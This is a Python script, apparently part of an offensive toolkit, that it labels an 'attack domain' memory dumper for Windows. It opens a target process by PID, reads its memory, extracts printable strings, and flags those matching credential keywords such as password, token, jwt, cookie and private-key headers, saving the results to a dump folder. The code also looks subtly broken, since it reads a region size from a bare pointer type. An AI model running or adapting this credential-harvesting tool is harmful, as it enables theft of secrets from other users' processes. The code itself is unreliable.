# 开发者：自由的风
"""memory_dumper/run.py — 进程内存转储
======================================
攻击域 ready — 转储目标进程内存,提取字符串/密钥/凭证。
"""
import sys, json, os, ctypes, re, string
from pathlib import Path
from datetime import datetime

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DUMP_DIR = Path.home() / ".gbt" / "dumps"
DUMP_DIR.mkdir(parents=True, exist_ok=True)

def do_dump(params):
    pid = params.get("pid", 0)
    if not pid: return {"ok": False, "error": "缺少pid"}
    try:
        kernel32 = ctypes.windll.kernel32
        PROCESS_VM_READ = 0x0010
        PROCESS_QUERY_INFORMATION = 0x0400
        h_process = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not h_process:
            return {"ok": False, "error": "无法打开进程(需管理员权限)"}
        # 枚举内存区域
        regions = []
        addr = 0
        while True:
            mem_info = ctypes.c_void_p()
            result = kernel32.VirtualQueryEx(h_process, ctypes.c_void_p(addr), ctypes.byref(mem_info), ctypes.sizeof(mem_info))
            if result == 0: break
            regions.append({"base": addr, "size": mem_info.RegionSize})
            addr += mem_info.RegionSize
            if len(regions) > 100: break
        # 读取可读内存并提取字符串
        strings_found = []
        for region in regions[:20]:
            try:
                buf = ctypes.create_string_buffer(region["size"])
                bytes_read = ctypes.c_size_t(0)
                if kernel32.ReadProcessMemory(h_process, region["base"], buf, region["size"], ctypes.byref(bytes_read)):
                    raw = buf.raw[:bytes_read.value]
                    # 提取ASCII/UTF-8字符串(>=4字符)
                    for m in re.finditer(b'[ -~]{4,}', raw):
                        s = m.group(0).decode("ascii", errors="ignore")
                        if len(s) >= 4:
                            strings_found.append(s)
            except: pass
        # 分析高价值字符串
        keywords = ["password","passwd","secret","token","key","api","auth","login","admin","credential",
                   "pwd","jwt","bearer","session","cookie","access","private","-----BEGIN"]
        findings = []
        for s in strings_found[:500]:
            for kw in keywords:
                if kw.lower() in s.lower():
                    findings.append({"keyword": kw, "string": s[:100]})
                    break
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        dump_file = DUMP_DIR / f"mem_{pid}_{ts}.txt"
        dump_file.write_text("\n".join(strings_found[:1000]), encoding="utf-8", errors="replace")
        return {"ok": True, "cap": "memory_dumper", "action": "dump", "domain": "攻击域",
                "pid": pid, "regions": len(regions), "strings_extracted": len(strings_found),
                "sensitive_findings": findings[:20], "dump_file": str(dump_file)}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}

HANDLERS = {"dump": do_dump}
if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "dump"
    params = {}
    if len(sys.argv) > 2:
        try: params = json.loads(sys.argv[2])
        except: pass
    handler = HANDLERS.get(action)
    result = handler(params) if handler else {"ok": False, "error": f"未知:{action}"}
    print(json.dumps(result, ensure_ascii=False, default=str))
